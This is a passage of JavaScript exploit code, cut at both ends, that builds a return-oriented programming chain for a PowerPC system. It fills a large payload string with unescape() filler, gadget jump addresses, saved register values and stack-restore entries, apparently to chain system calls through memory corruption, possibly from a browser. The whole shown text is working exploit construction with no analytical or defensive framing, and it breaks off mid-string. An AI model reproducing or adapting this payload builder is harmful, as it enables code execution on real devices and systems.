    return unescape("\u4141\u7EBE")+hexw2bin(g_2)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141")+hexw2bin(pad4)+hexw2bin(g_toc)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141")+hexw2bin(pad4)+hexw2bin(r30_temp)+hexw2bin(pad4)+hexw2bin(r31_temp)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
}

 // r3 gets set by r29 before calling next
function syscallGadgetSet1(a1_r3,a1_r4,a1_r5,a1_r6,a1_r7,a1_r8,a1_r9,a1_r10,a1_r11,a1_r29,a1_r30,a1_r31,a1_jumpto,a2_r3,a2_r29,a2_r30,a2_r31,a2_jumpto,a3_r3,a3_r4,a3_r5,a3_r6,a3_r7,a3_r8,a3_r9,a3_r10,a3_r11,a3_r29,a3_r30,a3_r31,a3_jumpto,a4_r3,a4_r29,a4_r30,a4_r31,a4_jumpto,a5_r3,a5_r4,a5_r5,a5_r6,a5_r7,a5_r8,a5_r9,a5_r10,a5_r11,a5_r29,a5_r30,a5_r31,a5_jumpto,a6_r3,a6_r29,a6_r30,a6_r31,a6_jumpto,a7_r3,a7_r4,a7_r5,a7_r6,a7_r7,a7_r8,a7_r9,a7_r10,a7_r11,a7_r29,a7_r30,a7_r31,a7_jumpto,a8_r3,a8_r29,a8_r30,a8_r31,a8_jumpto,a9_r3,a9_r4,a9_r5,a9_r6,a9_r7,a9_r8,a9_r9,a9_r10,a9_r11,a9_r29,a9_r30,a9_r31,a9_jumpto,a10_r3,a10_r29,a10_r30,a10_r31,a10_jumpto,a11_r3,a11_r4,a11_r5,a11_r6,a11_r7,a11_r8,a11_r9,a11_r10,a11_r11,a11_r29,a11_r30,a11_r31,a11_jumpto,a12_r3,a12_r29,a12_r30,a12_r31,a12_jumpto,a13_r3,a13_r4,a13_r5,a13_r6,a13_r7,a13_r8,a13_r9,a13_r10,a13_r11,a13_r29,a13_r30,a13_r31,a13_jumpto,a14_r3,a14_r29,a14_r30,a14_r31,a14_jumpto,a15_r3,a15_r4,a15_r5,a15_r6,a15_r7,a15_r8,a15_r9,a15_r10,a15_r11,a15_r29,a15_r30,a15_r31,a15_jumpto,a16_r3,a16_r29,a16_r30,a16_r31,a16_jumpto,a17_r3,a17_r4,a17_r5,a17_r6,a17_r7,a17_r8,a17_r9,a17_r10,a17_r11,a17_r29,a17_r30,a17_r31,a17_jumpto,a18_r3,a18_r29,a18_r30,a18_r31,a18_jumpto,a19_r3,a19_r29,a19_r30,a19_r31,a19_jumpto,a20_r3,a20_r4,a20_r5,a20_r6,a20_r7,a20_r8,a20_r9,a20_r10,a20_r11,a20_r29,a20_r30,a20_r31,a20_jumpto,a21_r3,a21_r29,a21_r30,a21_r31,a21_jumpto,a22_r3,a22_r29,a22_r30,a22_r31,a22_jumpto,a23_r3,a23_r4,a23_r5,a23_r6,a23_r7,a23_r8,a23_r9,a23_r10,a23_r11,a23_r29,a23_r30,a23_r31,a23_jumpto,a24_r3,a24_r29,a24_r30,a24_r31,a24_jumpto,a25_r3,a25_r29,a25_r30,a25_r31,a25_jumpto,a26_r3,a26_r4,a26_r5,a26_r6,a26_r7,a26_r8,a26_r9,a26_r10,a26_r11,a26_r29,a26_r30,a26_r31,a26_jumpto,a27_r3,a27_r29,a27_r30,a27_r31,a27_jumpto,a28_r3,a28_r29,a28_r30,a28_r31,a28_jumpto,a29_r3,a29_r4,a29_r5,a29_r6,a29_r7,a29_r8,a29_r9,a29_r10,a29_r11,a29_r29,a29_r30,a29_r31,a29_jumpto,a30_r3,a30_r29,a30_r30,a30_r31,a30_jumpto,a31_r3,a31_r29,a31_r30,a31_r31,a31_jumpto,a32_r3,a32_r4,a32_r5,a32_r6,a32_r7,a32_r8,a32_r9,a32_r10,a32_r11,a32_r29,a32_r30,a32_r31,a32_jumpto,a33_r3,a33_r29,a33_r30,a33_r31,a33_jumpto,padding1,padding2,padding3,padding4,extra1,extra2,extra3,extra4,extra5,extra6,extra7)
{
    return unescape(hexw2bin(pad4)+hexw2bin(a1_jumpto)+unescape("\u10E1\u12E3\u14E5\u16E7\u18E9\u1AEB\u1CED\u1EEF\u10F1\u12F3\u14F5\u16F7\u18F9\u1AFB\u1CFD\u1EFF\u1FFF\u1000\u1102\u1304\u1506\u1708\u1910\u1112\u1314\u1516\u1718\u1920\u1122\u1324\u1526\u1728\u1930\u1132\u1334\u1536\u1738\u1940\u1142\u1344\u1546\u1748\u1950\u1152\u1354\u1556")+hexw2bin(a1_r11)+hexw2bin(a1_r10)+hexw2bin(a1_r8)+hexw2bin(a1_r7)+hexw2bin(a1_r6)+hexw2bin(a1_r5)+hexw2bin(a1_r4)+unescape("\u1586\u1788")+hexw2bin(a1_r9)+unescape("\u1394\u1596\u1798\u1900\u10A1\u12A3\u14A5\u16A7")+hexw2bin(pad4)+hexw2bin(a1_r3)+hexw2bin(pad4)+hexw2bin(a1_r30)+hexw2bin(pad4)+hexw2bin(a1_r31)+unescape("\u10C1\u12C3\u14C5\u16C7\u18C9\u1ACB\u1CCD\u1ECF")+hexw2bin(pad4)+hexw2bin(a2_jumpto)+unescape("\u28D9\u2ADB\u2CDD\u2EDF\u20E1\u22E3\u24E5\u26E7\u28E9\u2AEB\u2CED\u2EEF\u20F1\u22F3\u24F5\u26F7\u28F9\u2AFB\u2CFD\u2EFF\u2FFF\u2000\u2102\u2304\u2506\u2708\u2910\u2112\u2314\u2516\u2718\u2920\u2122\u2324\u2526\u2728\u2930\u2132\u2334\u2536\u2738\u2940\u2142\u2344\u2546\u2748\u2950\u2152")+hexw2bin(pad4)+hexw2bin(a2_r29)+hexw2bin(extra2)+hexw2bin(extra3)+hexw2bin(pad4)+hexw2bin(a2_r31)+unescape("\u2778\u2980\u2182\u2384\u2586\u2788\u2990\u2192")+hexw2bin(pad4)+hexw2bin(a3_jumpto)+unescape("\u20A1\u22A3\u24A5\u26A7\u18A9\u2AAB\u2CAD\u2EAF\u20B1\u22B3\u24B5\u26B7\u28B9\u2ABB\u2CBD\u2EBF")+hexw2bin(pad4)+hexw2bin(a4_r29)+unescape("\u28C9\u2ACB\u2CCD\u2ECF\u20D1\u22D3\u24D5\u26D7\u28D9\u2ADB\u2CDD\u2EDF\u20E1\u22E3\u24E5\u26E7")+hexw2bin(pad4)+hexw2bin(a3_jumpto)+unescape("\u30F1\u32F3\u34F5\u36F7\u18F9\u6AFB")+hexw2bin(a3_r11)+hexw2bin(a3_r10)+hexw2bin(a3_r8)+hexw2bin(a3_r7)+hexw2bin(a3_r6)+hexw2bin(a3_r5)+hexw2bin(a3_r4)+unescape("\u3122\u3324")+hexw2bin(a3_r9)+unescape("\u3930\u3132\u3334\u3536\u3738\u3940\u3142\u3344")+hexw2bin(pad4)+hexw2bin(a3_r29)+hexw2bin(pad4)+hexw2bin(a3_r30)+hexw2bin(pad4)+hexw2bin(a3_r31)+unescape("\u3970\u3172\u3374\u3576")+hexw2bin(pad4)+hexw2bin(a3_r3)+hexw2bin(pad4)+hexw2bin(a3_r30)+hexw2bin(padding1)+hexw2bin(a3_r31)+hexw2bin(pad4)+hexw2bin(a4_r30)+hexw2bin(pad4)+hexw2bin(a4_r31)+hexw2bin(pad4)+hexw2bin(a4_jumpto)+unescape("\u38B9\u3ABB\u3CBD\u3EBF")+hexw2bin(pad4)+hexw2bin(a4_jumpto)+unescape("\u48C9\u4ACB\u4CCD\u4ECF\u40D1\u42D3\u44D5\u46D7\u48D9\u4ADB\u4CDD\u4EDF\u40E1\u42E3\u44E5\u46E7\u48E9\u4AEB\u4CED\u4EEF\u40F1\u42F3\u44F5\u46F7\u48F9\u4AFB\u4CFD\u4EFF\u4FFF\u4102\u4304\u4506\u4708\u4910\u4112\u4314\u4516\u4718")+hexw2bin(a4_r11)+hexw2bin(a4_r10)+hexw2bin(a4_r8)+hexw2bin(a4_r7)+hexw2bin(a4_r6)+hexw2bin(a4_r5)+hexw2bin(a4_r4)+unescape("\u4748\u4950")+hexw2bin(a4_r9)+hexw2bin(a5_r5)+hexw2bin(a5_r4)+unescape("\u4364\u4566\u4768\u4970")+hexw2bin(pad4)+hexw2bin(a4_r3)+hexw2bin(pad4)+hexw2bin(a4_r30)+hexw2bin(pad4)+hexw2bin(a4_r31)+hexw2bin(pad4)+hexw2bin(restore_stack1)+hexw2bin(pad4)+hexw2bin(a5_r30)+hexw2bin(pad4)+hexw2bin(a5_jumpto)+unescape("\u48D9\u4ADB\u4CDD\u4EDF")+hexw2bin(pad4)+hexw2bin(a5_r31)+unescape("\u58E9\u5AEB\u5CED\u5EEF\u50F1\u55F3\u54F5\u56F7\u58F9\u5AFB\u5CFD\u5EFF\u1FFF\u5000\u5105\u5304\u5506\u5708\u5910\u5115\u5314\u5516\u5718\u5950\u5155\u5354\u5556\u5758\u5930\u5135\u5334\u5536\u5738\u5940\u5145\u5344\u5546\u5748\u5950\u5155\u5354\u5556\u5758\u5960\u5165\u5364\u5566\u5768")+hexw2bin(pad4)+hexw2bin(a6_r29)+hexw2bin(pad4)+hexw2bin(a6_r30)+hexw2bin(pad4)+hexw2bin(a6_r31)+unescape("\u5394\u5596\u5798\u5900\u50A1\u52A3\u54A5\u56A7")+hexw2bin(pad4)+hexw2bin(a6_jumpto)+unescape("\u50B1\u55B3\u54B5\u56B7\u58B9\u5ABB\u5CBD\u5EBF")+hexw2bin(pad4)+hexw2bin(extra1)+unescape("\u58C9\u5ACB\u5CCD\u5ECF")+hexw2bin(pad4)+hexw2bin(a6_r29)+unescape("\u58D9\u5ADB\u5CDD\u5EDF\u50E1\u55E3\u54E5\u56E7")+hexw2bin(pad4)+hexw2bin(a6_jumpto)+unescape("\u50F1\u52F3\u54F5\u56F7")+hexw2bin(pad4)+hexw2bin(a6_jumpto)+unescape("\u6FFF\u6000\u6102\u6604\u6506\u6708\u6910\u6112\u6614\u6516\u6718\u6920\u6122\u6624\u6526\u6728\u6960\u6162\u6664\u6566\u6768\u6940\u6142\u6644\u6546\u6748\u6950\u6152\u6654\u6556\u6758\u6960\u6162\u6664\u6566\u6768\u6970\u6172\u6674\u6576")+hexw2bin(pad4)+hexw2bin(a6_r3)+hexw2bin(pad4)+hexw2bin(a6_r30)+hexw2bin(pad4)+hexw2bin(a6_r31)+hexw2bin(pad4)+hexw2bin(a6_r30)+hexw2bin(pad4)+hexw2bin(a6_r31)+hexw2bin(pad4)+hexw2bin(a7_jumpto)+unescape("\u78B9\u7ABB\u7CBD\u7EBF")+hexw2bin(pad4)+hexw2bin(extra2)+unescape("\u78C9\u7ACB\u7CCD\u7ECF\u70D1\u72D3\u77D5\u76D7\u78D9\u7ADB\u7CDD\u7EDF")+hexw2bin(pad4)+hexw2bin(a7_jumpto)+unescape("\u78E9\u7AEB\u7CED\u7EEF\u70F1\u72F3\u77F5\u76F7\u78F9\u7AFB\u7CFD\u7EFF\u7FFF\u7102\u7307\u7506\u7708\u7910\u7112\u7317\u7516\u7718")+hexw2bin(a7_r11)+hexw2bin(a7_r10)+hexw2bin(a7_r8)+hexw2bin(a7_r7)+hexw2bin(a7_r6)+hexw2bin(a7_r5)+hexw2bin(a7_r4)+hexw2bin(a6_r7)+hexw2bin(a7_r9)+hexw2bin(a6_r5)+hexw2bin(a6_r4)+hexw2bin(a6_r3)+hexw2bin(a6_r9)+hexw2bin(pad4)+hexw2bin(a7_r3)+hexw2bin(pad4)+hexw2bin(a7_r30)+hexw2bin(pad4)+hexw2bin(a7_r31)+hexw2bin(pad4)+hexw2bin(restore_stack2)+unescape("\u72A3\u74A5\u76A7\u78A9")+hexw2bin(pad4)+hexw2bin(a8_jumpto)+unescape("\u88D9\u8ADB\u8CDD\u8EDF\u80E1\u88E3\u84E5\u86E7\u88E9\u8AEB\u8CED\u8EEF\u80F1\u88F3\u84F5\u86F7\u88F9\u8AFB\u8CFD\u8EFF\u8FFF\u8000\u8108\u8304\u8506\u8708\u8910\u8118\u8314\u8516\u8718\u8980\u8188\u8384\u8586\u8788\u8930\u8138\u8334\u8536\u8738\u8940\u8148\u8344")+hexw2bin(extra4)+unescape("\u8950\u8158\u8354\u8556\u8758\u8960")+hexw2bin(pad4)+hexw2bin(a9_r20)+hexw2bin(pad4)+hexw2bin(a9_r21)+hexw2bin(pad4)+hexw2bin(a9_r22)+hexw2bin(pad4)+hexw2bin(a9_r23)+hexw2bin(pad4)+hexw2bin(a9_r24)+hexw2bin(pad4)+hexw2bin(a9_r25)+hexw2bin(pad4)+hexw2bin(a9_r26)+hexw2bin(pad4)+hexw2bin(a9_r27)+hexw2bin(pad4)+hexw2bin(a9_r28)+hexw2bin(pad4)+hexw2bin(a9_r29)+hexw2bin(pad4)+hexw2bin(a9_r30)+hexw2bin(pad4)+hexw2bin(a9_r31)+unescape("\u88D9\u8ADB\u8CDD\u8EDF\u80E1\u88E3\u84E5\u86E7")+hexw2bin(pad4)+hexw2bin(a9_jumpto)+unescape("\u90F1\u92F9\u94F5\u96F7\u98F9\u9AFB\u9CFD\u9EFF\u9FFF\u9000\u9102\u9904\u9506\u9708\u9910\u9112\u9914\u9516\u9718\u9920\u9122\u9924\u9526\u9728\u9990\u9192\u9994\u9596\u9798\u9940\u9142\u9944\u9546\u9748\u9950\u9152\u9954\u9556\u9758\u9960\u9162\u9964\u9566\u9768\u9970\u9172\u9974\u9576")+hexw2bin(pad4)+hexw2bin(a9_r3)+hexw2bin(pad4)+hexw2bin(a9_r30)+hexw2bin(pad4)+hexw2bin(a9_r31)+hexw2bin(pad4)+hexw2bin(extra5)+unescape("\u98A9\u9AAB\u9CAD\u9EAF")+hexw2bin(pad4)+hexw2bin(a10_jumpto)+hexw2bin(pad4)+hexw2bin(a10_r29)+hexw2bin(pad4)+hexw2bin(a10_r30)+hexw2bin(pad4)+hexw2bin(a10_r31)+unescape("\uA0D1\uA2D3\uAAD5\uA6D7\uA8D9\uAADB\uACDD\uAEDF")+hexw2bin(pad4)+hexw2bin(extra5)+unescape("\uA8E9\uAAEB\uACED\uAEEF\uA0F1\uA2F3\uAAF5\uA6F7\uA8F9\uAAFB\uACFD\uAEFF\uAFFF\uA102")+hexw2bin(extra4)+unescape("\uA708\uA910\uA112\uA31A")+hexw2bin(extra2)+hexw2bin(a10_r11)+hexw2bin(a10_r10)+hexw2bin(a10_r8)+hexw2bin(a10_r7)+hexw2bin(a10_r6)+hexw2bin(a10_r5)+hexw2bin(a10_r4)+unescape("\uA748\uA950")+hexw2bin(a10_r9)+hexw2bin(pad4)+hexw2bin(a10_r3)+unescape("\uA364\uA566\uA768\uA970")+hexw2bin(pad4)+hexw2bin(a10_r3)+hexw2bin(pad4)+hexw2bin(a10_r30)+hexw2bin(pad4)+hexw2bin(a10_r31)+hexw2bin(pad4)+hexw2bin(extra1)+unescape("\uA2A3\uA4A5\uA6A7\uA8A9")+hexw2bin(pad4)+hexw2bin(a11_jumpto)+hexw2bin(pad4)+hexw2bin(extra2)+unescape("\uB0E1\uBBE3\uB4E5\uB6E7\uB8E9\uBAEB\uBCED\uBEEF\uB0F1\uBBF3\uB4F5\uB6F7\uB8F9\uBAFB\uBCFD\uBEFF\uBFFF\uB000\uB10B\uB304\uB506\uB708\uB910\uB11B\uB314\uB516\uB718\uB9B0\uB1BB\uB3B4\uB5B6\uB7B8\uB930\uB13B\uB334\uB536\uB738\uB940\uB14B\uB344\uB546\uB748\uB950\uB15B\uB354\uB556\uB758\uB960\uB16B\uB364\uB566\uB768\uB970\uB17B\uB374\uB576\uB778\uB980\uB18B\uB384\uB586\uB788\uB990\uB19B\uB394\uB596\uB798\uB900\uB0A1\uBBA3\uB4A5\uB6A7\u48A9\uBAAB\uBCAD\uBEAF\uB0B1\uBBB3\uB4B5\uB6B7\uB8B9\uBABB\uBCBD\uBEBF\uB0C1\uBBC3\uB4C5\uB6C7\uB8C9\uBACB\uBCCD\uBECF\uB0D1\uBBD3\uB4D5\uB6D7")+hexw2bin(pad4)+hexw2bin(extra3)+unescape("\uB0E1\uBBE3\uB4E5\uB6E7")+hexw2bin(pad4)+hexw2bin(a12_jumpto)+unescape("\uC0F1\uC2FC\uC4F5\uC6F7\uC8F9\uCAFB\uCCFD\uCEFF\uCFFF\uC000\uC102\uCC04\uC506\uC708\uC910\uC112\uCC14\uC516\uC718\uC920\uC122\uCC24\uC526\uC728\uC9C0\uC1C2\uCCC4\uC5C6\uC7C8\uC940\uC142\uCC44\uC546\uC748\uC950\uC152\uCC54\uC556\uC758\uC960\uC162\uCC64\uC566\uC768\uC970\uC172\uCC74\uC576")+hexw2bin(pad4)+hexw2bin(a13_r3)+hexw2bin(pad4)+hexw2bin(a13_r30)+hexw2bin(pad4)+hexw2bin(a13_r31)+unescape("\uC0A1\uC2A3\uC4A5\uC6A7\uC8A9\uCAAB\uCCAD\uCEAF")+hexw2bin(pad4)+hexw2bin(a13_jumpto)+unescape("\uD8B9\uDABB\uDCBD\uDEBF\uD0C1\uD2C3\uDDC5\uD6C7\uD8C9\uDACB\uDCCD\uDECF\uD0D1\uD2D3\uDDD5\uD6D7\uD8D9\uDADB\uDCDD\uDEDF\uD0E1\uD2E3\uDDE5\uD6E7\uD8E9\uDAEB\uDCED\uDEEF\uD0F1\uD2F3")+hexw2bin(extra6)+unescape("\uD8F9\uDAFB\uDCFD\uDEFF\uDFFF\uD102\uD30D\uD506\uD708\uD910\uD112\uD31D\uD516\uD718")+hexw2bin(a14_r11)+hexw2bin(a14_r10)+hexw2bin(a14_r8)+hexw2bin(a14_r7)+hexw2bin(a14_r6)+hexw2bin(a14_r5)+hexw2bin(a14_r4)+unescape("\uD748\uD950")+hexw2bin(a14_r9)+hexw2bin(pad4)+hexw2bin(a14_r31)+unescape("\uD364\uD566\uD768\uD970")+hexw2bin(pad4)+hexw2bin(a15_r3)+hexw2bin(pad4)+hexw2bin(a15_r30)+hexw2bin(pad4)+hexw2bin(a15_r31)+hexw2bin(pad4)+hexw2bin(restore_stack3)+unescape("\uD2A3\uD4A5\uD6A7\uD8A9")+hexw2bin(pad4)+hexw2bin(a14_jumpto)+hexw2bin(pad4)+hexw2bin(a15_r31)+unescape("\uE0E1\uEEE3\uE4E5\uE6E7\uE8E9\uEAEB\uECED\uEEEF")+hexw2bin(pad4)+hexw2bin(a16_jumpto)+unescape("\uE8F9\uEAFB\uECFD\uEEFF\uEFFF\uE000\uE10E\uE304\uE506\uE708\uE910\uE11E\uE314\uE516\uE718\uE9E0\uE1EE\uE3E4\uE5E6\uE7E8\uE930\uE13E\uE334\uE536\uE738\uE940\uE14E\uE344\uE546\uE748\uE950\uE15E\uE354\uE556\uE758\uE960\uE16E\uE364\uE566\uE768\uE970\uE17E\uE374\uE576\uE778\uE980")+hexw2bin(a15_r11)+hexw2bin(a15_r10)+unescape("\uE990\uE19E\uE394\uE596\uE798\uE900\uE0A1\uEEA3\uE4A5\uE6A7\u58A9\uEAAB")+hexw2bin(a15_r9)+unescape("\uE0B1\uEEB3\uE4B5\uE6B7\uE8B9\uEABB\uECBD\uEEBF\uE0C1\uEEC3\uE4C5\uE6C7")+hexw2bin(pad4)+hexw2bin(a15_jumpto)+hexw2bin(pad4)+hexw2bin(a16_r31)+hexw2bin(pad4)+hexw2bin(restore_stack9)+unescape("\uE0E1\uEEE3\uE4E5\uE6E7")+hexw2bin(pad4)+hexw2bin(a15_jumpto)+unescape("\uF0F1\uF2FF\uF4F5\uF6F7\uF8F9\uFAFB\uFCFD\uFEFF\uFFFF\uF000\uF102\uFF04\uF506\uF708\uF910\uF112\uFF14\uF516\uF718\uF920\uF122\uFF24\uF526\uF728\uFAF0\uF1F2\u1FF4\uF5F6\uF7F8\uF940\uF142\uFF44\uF146\uF748\uF150\uF152\uFF54\uF556\uF758\uF960\uF162\uFF64\uF566\uF768")+hexw2bin(pad4)+hexw2bin(a17_jumpto)+hexw2bin(pad4)+hexw2bin(a16_r3)+hexw2bin(pad4)+hexw2bin(a16_r30)+hexw2bin(pad4)+hexw2bin(a16_r31)+unescape("\uF1A1\uF2A3\uF4A5\uF6A7")+hexw2bin(pad4)+hexw2bin(a19_r31)+hexw2bin(pad4)+hexw2bin(a16_jumpto)+hexw2bin(pad4)+hexw2bin(a17_jumpto)+hexw2bin(pad4)+hexw2bin(a19_jumpto)+hexw2bin(pad4)+hexw2bin(a17_r31)+unescape("\u08C9\u0ACB\u0CCD\u0ECF\u00D1\u02D3\u00D5\u06D7")+hexw2bin(pad4)+hexw2bin(a18_jumpto)+hexw2bin(restore_stack4a)+unescape("\u28E9\u0AEB\u0CED\u0EEF\u00F1\u02F3\u00F5\u06F7\u08F9\u0AFB\u0CFD\u0EFF\u2FFE\u0102")+hexw2bin(a17_r9)+unescape("\u0708\u0910\u0112\u0310\u0516\u0718")+hexw2bin(a17_r11)+hexw2bin(a17_r10)+hexw2bin(a17_r8)+hexw2bin(a17_r7)+hexw2bin(a17_r6)+hexw2bin(a17_r5)+hexw2bin(a17_r4)+hexw2bin(pad4)+hexw2bin(a17_r9)+unescape("\u0556\u0758\u0960\u0162")+hexw2bin(pad4)+hexw2bin(a18_jumpto)+hexw2bin(pad4)+hexw2bin(a18_jumpto)+hexw2bin(pad4)+hexw2bin(a17_r3)+hexw2bin(pad4)+hexw2bin(a17_r30)+hexw2bin(pad4)+hexw2bin(a17_r31)+hexw2bin(pad4)+hexw2bin(restore_stack4)+unescape("\u02A3\u04A5\u06A7\u08A9")+hexw2bin(pad4)+hexw2bin(a17_jumpto)+unescape("\u18D9\u1ADB\u1CDD\u1EDF\u10E1\u11E3\u14E5\u16E7\u38E9\u1AEB\u2CED\u1EEF\u10F1\u11F3\u24F5\u16F7\u28F9\u1AFB\u1CFD\u1EFF\u3FFF\u1000\u1101\u1304\u2506\u2708")+hexw2bin(pad4)+hexw2bin(a20_r31)+unescape("\u2222\u1314\u1516\u1718\u1930\u1131")+hexw2bin(extra7)+hexw2bin(pad4)+hexw2bin(a20_jumpto)+unescape("\u1546\u1748\u1950\u1151\u1354\u1556\u1758\u1960\u1161\u1364\u1566\u1768")+hexw2bin(pad4)+hexw2bin(a17_jumpto)+unescape("\u1778\u1980\u1181\u1384\u1586\u1788\u1990\u1191\u1394\u1596\u1798\u1900\u10A1\u11A3\u14A5\u16A7\u68A9\u1AAB\u1CAD\u1EAF")+hexw2bin(pad4)+hexw2bin(a19_jumpto)+unescape("\u4209\u1ABB\u1CBD\u1EBF")+hexw2bin(a20_r11)+hexw2bin(a20_r10)+hexw2bin(a21_r10)+unescape("\u1CCD\u1ECF")+hexw2bin(pad4)+hexw2bin(a23_jumpto)+unescape("\u28D9\u1ADB\u2CDD\u1EDF\u10E1\u11E3\u14E5\u16E7")+hexw2bin(pad4)+hexw2bin(a18_jumpto)+unescape("\uF0F1\uF2FF\uF4F5\uF6F7\uF8F9\uFAFB\uFBFD\uFEFF\uFFFF\uF000\uF202\uFF04\uF506\uF708\uF910\uF112\uFF14\uF516\uE718\uF920\uF122\uFF24")+hexw2bin(pad4)+hexw2bin(pad4)+hexw2bin(a22_jumpto)+unescape("\uF7F8\uF940\uF142\uFF44")+hexw2bin(pad4)+hexw2bin(a21_jumpto)+unescape("\uFF54\uF556\uF758\uF960\uF162\uFF64\uF566\uF768")+hexw2bin(pad4)+hexw2bin(a19_jumpto)+hexw2bin(pad4)+hexw2bin(a19_r3)+hexw2bin(pad4)+hexw2bin(a19_r30)+hexw2bin(pad4)+hexw2bin(a19_r31)+unescape("\uF2A1\uF2A3\uF4A5\uF6A7\u28A9\uFAAB\uFCAD\uFEAF")+hexw2bin(pad4)+hexw2bin(a19_jumpto)+unescape("\u18B9\u0ABB\u0CBD\u0EBF\u30C1\u02C3\u00C5\u26C7\u08C9\u0ACB\u0CCD\u0ECF\u00D1\u02D3\u00D5\u06D7\u18D9\u0ADB\u0CDD\u0EDF")+hexw2bin(pad4)+hexw2bin(a21_r31)+unescape("\u28E9\u0AEB\u0CED\u0EEF\u00F1\u02F3\u00F5\u16F7")+hexw2bin(pad4)+hexw2bin(a21_jumpto)+unescape("\u2FFD\u0102\u0300\u0B06\u0708\u0910\u0112\u1310\u0516\u0718")+hexw2bin(a20_r11)+hexw2bin(a20_r10)+hexw2bin(a20_r8)+hexw2bin(a20_r7)+hexw2bin(a20_r6)+hexw2bin(a20_r5)+hexw2bin(a20_r4)+unescape("\u2748\u0950")+hexw2bin(a20_r9)+unescape("\u0556\u0758\u0960\u0162")+hexw2bin(pad4)+hexw2bin(a20_jumpto)+hexw2bin(pad4)+hexw2bin(a20_r3)+hexw2bin(pad4)+hexw2bin(a20_r30)+hexw2bin(pad4)+hexw2bin(a20_r31)+hexw2bin(pad4)+hexw2bin(restore_stack5)+unescape("\u02A3\u04A5\u06A7\u08A9")+hexw2bin(pad4)+hexw2bin(a20_jumpto)+unescape("\u38D9\u1ADB\u3CDD\u1EDF\u10E1\u11E3\u14E5\u16E7\u48E9\u1AEB\u3CED\u1EEF\u10F1\u11F3\u34F5\u16F7\u48F9\u1AFB\u1CFD\u1EFF")+hexw2bin(pad4)+hexw2bin(a23_r31)+hexw2bin(pad4)+hexw2bin(a23_r11)+unescape("\u1314\u1516\u1718\u4910")+hexw2bin(pad4)+hexw2bin(a23_jumpto)+unescape("\u3334\u1536\u1738\u1940\u1141\u2344\u1546\u1748\u1950\u1151\u1354\u1556\u2758\u1960\u1161\u1364\u1566\u1768\u2970\u1171\u1374\u1576\u1778\u1980\u1181\u1384\u1586\u1788\u2990\u1191\u1394\u1596\u1798\u1900\u10A1\u11A3\u14A5\u16A7\u68A9\u1AAB\u1CAD\u1EAF\u30B1\u11B3\u14B5\u16B7")+hexw2bin(a24_r11)+unescape("\u1CBD\u1EBF\u40C1\u11C3\u34C5\u36C7\u38C9\u1ACB\u1CCD\u1ECF\u20D1\u11D3\u14D5\u16D7\u48D9\u1ADB\u4CDD\u1EDF\u10E1\u11E3\u14E5\u16E7")+hexw2bin(pad4)+hexw2bin(a21_jumpto)+unescape("\uF0F1\uF2FF\uF4F5\uF6F7\uF8F9\uFAFB")+hexw2bin(pad4)+hexw2bin(a24_r31)+hexw2bin(pad4)+hexw2bin(a24_r11)+unescape("\uF910\uF112\uFF14\uF516")+hexw2bin(pad4)+hexw2bin(a24_jumpto)+unescape("\uF726\uF728\uFCF0\uF1F2")+hexw2bin(pad4)+hexw2bin(a24_r11)+unescape("\uF142\uFF44\uF346\uF748")+hexw2bin(pad4)+hexw2bin(a24_jumpto)+unescape("\uF960\uF162\uFF64\uF566\uF768")+hexw2bin(pad4)+hexw2bin(a22_jumpto)+hexw2bin(pad4)+hexw2bin(a22_r3)+hexw2bin(pad4)+hexw2bin(a22_r30)+hexw2bin(pad4)+hexw2bin(a22_r31)+unescape("\uF3A1\uF2A3\uF4A5\uF6A7\u38A9\uFAAB\uFCAD\uFEAF")+hexw2bin(pad4)+hexw2bin(a22_jumpto)+unescape("\u48B9\u0ABB\u0CBD\u0EBF\u20C1\u02C3\u00C5\u26C7\u08C9\u0ACB\u0CCD\u0ECF\u00D1\u02D3\u00D5\u06D7\u28D9\u0ADB\u0CDD\u0EDF\u20E1\u02E3\u00E5\u06E7\u38E9\u0AEB\u0CED\u0EEF\u00F1\u02F3\u00F5\u26F7\u28F9\u0AFB\u0CFD\u0EFF\u3FFF\u0102\u0300\u0C06\u0708\u0910\u0112\u2310\u0516\u0718")+hexw2bin(a23_r11)+hexw2bin(a23_r10)+hexw2bin(a23_r8)+hexw2bin(a23_r7)+hexw2bin(a23_r6)+hexw2bin(a23_r5)+hexw2bin(a23_r4)+unescape("\u3748\u0950")+hexw2bin(a23_r9)+unescape("\u0556\u0758\u0960\u0162")+hexw2bin(pad4)+hexw2bin(a23_jumpto)+hexw2bin(pad4)+hexw2bin(a23_r3)+hexw2bin(pad4)+hexw2bin(a23_r30)+hexw2bin(pad4)+hexw2bin(a23_r31)+hexw2bin(pad4)+hexw2bin(restore_stack6)+unescape("\u02A3\u04A5\u06A7\u08A9")+hexw2bin(pad4)+hexw2bin(a23_jumpto)+unescape("\u58D9\u1ADB\u5CDD\u1EDF\u10E1\u11E3\u14E5\u16E7\u58E9\u1AEB\u4CED\u1EEF\u10F1\u11F3\u44F5\u16F7\u58F9\u1AFB\u1CFD\u1EFF\u3FFF\u1000\u1101\u1304\u4506\u4708\u5910\u5555\u1314\u1516\u1718\u6910\u6666\u1314\u1516")+hexw2bin(pad4)+hexw2bin(a25_r11)+unescape("\u1536\u1738\u1940\u1141\u3344\u1546\u1748\u1950\u1151\u1354\u1556\u3758\u1960\u1161\u1364\u1566\u1768\u3970\u1171\u1374\u1576\u1778\u1980\u1181\u1384\u1586\u1788\u3990\u1191\u1394\u1596\u1798\u1900\u10A1\u11A3\u14A5\u16A7\u68A9\u1AAB\u1CAD\u1EAF\u40B1\u11B3\u14B5\u26B7")+hexw2bin(a25_r11)+unescape("\u1CBD\u1EBF\u50C1\u11C3\u44C5\u46C7\u48C9\u1ACB\u1CCD\u1ECF\u30D1\u11D3\u14D5\u16D7\u68D9\u1ADB\u6CDD\u1EDF\u10E1\u11E3\u14E5\u16E7")+hexw2bin(pad4)+hexw2bin(a24_jumpto)+unescape("\uF0F1\uF2FF\uF4F5\uF6F7\uF8F9\uFAFB\uF9FD\uFEFF\uFFFF\uF000\uF402\uFF04\uF506\uF708\uF910\uF112\uFF14\uF516\uC718\uF920\uF122\uFF24\uF826\uF728\uFDF0\uF1F2\u3FF4\uF5F6\uF7F8\uF9